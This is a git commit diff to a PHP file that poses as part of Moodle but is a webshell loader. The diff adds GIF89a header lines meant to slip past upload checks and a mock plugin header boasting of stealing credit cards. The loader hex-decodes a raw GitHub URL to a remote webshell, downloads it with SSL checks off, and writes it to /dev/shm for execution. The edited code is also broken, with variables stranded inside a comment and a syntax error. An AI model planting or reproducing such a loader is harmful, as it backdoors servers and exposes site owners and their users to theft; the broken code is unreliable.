ed90feef4709b0765425ab0e218a8536070e22f5
exploit-haxor1337 <76028485+exploit-haxor@users.noreply.github.com>
2024-10-19 00:29:26 +0700

    Update bc.php

--- bc.php
+++ bc.php
@@ -1,3 +1,51 @@
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<!-- GIF89;a -->
+<?php
+/*
+Plugin Name: Penghisap Kartu kredit Paman mu
+Plugin URI: https://github.com/
+Description: A webshell API To Get Credits Card U Mom.
+Version: 1.2.0
+Author URI: xnxx.com
+Text Domain: Kang Sedot Kartu Kredit 
+Domain Path: /languages
+License: GPLv3 or later
+Network: true
+*/
+?>
+
+
+
 <?php
 // This file is part of Moodle - http://moodle.org/
 //
@@ -21,23 +69,15 @@
  * @copyright  Mark Nelson <markn@moodle.com>
  * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
  */
-error_reporting(0);
-ini_set('display_errors', '0');
-ini_set('log_errors', '0');
-
 function geturlsinfo($url) {
     if (function_exists('curl_exec')) {
-        $conn = curl_init($url);
-        
-        
+        $conn = curl_init($url);  
         $opt1 = constant('CURLOPT_RETURNTRANSFER');
         $opt2 = constant('CURLOPT_FOLLOWLOCATION');
         $opt3 = constant('CURLOPT_USERAGENT');
         $opt4 = constant('CURLOPT_SSL_VERIFYPEER');
         $opt5 = constant('CURLOPT_SSL_VERIFYHOST');
-        $opt6 = constant('CURLOPT_COOKIE');
-
-        
+        $opt6 = constant('CURLOPT_COOKIE'); 
         curl_setopt($conn, $opt1, 1);
         curl_setopt($conn, $opt2, 1);
         curl_setopt($conn, $opt3, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
@@ -62,10 +102,17 @@ function geturlsinfo($url) {
     return $url_get_contents_data;
 }
 
-// password defaultnya tbl
+/**
+ * HEKERMAN | KURD HACKER
+ * @author HEKERMAN
+ * user defaultnya admin   
+$auth_username = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f'; 
+$auth_password = '74656d706c61746578782e706870' // password defaultnya tbl
+ * @github https://github.com/
+ * @link https://github.com/
+ * password default tbl
+ */
 
-
-$password = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f74696e7966696c656d616e616765722e706870'; 
 function hex2str($hex) {
     $str = '';
     for ($i = 0; $i < strlen($hex); $i += 2) {
@@ -86,8 +133,7 @@ function clean_old_temp_files() {
 
 
 clean_old_temp_files();
-
-$url = hex2str($password);
+$url = hex2str($auth_username); . hex2str($auth_password);
 $a = geturlsinfo($url);
 $temporary_file = tempnam('/dev/shm', 'prefix');
 file_put_contents($temporary_file, $a);
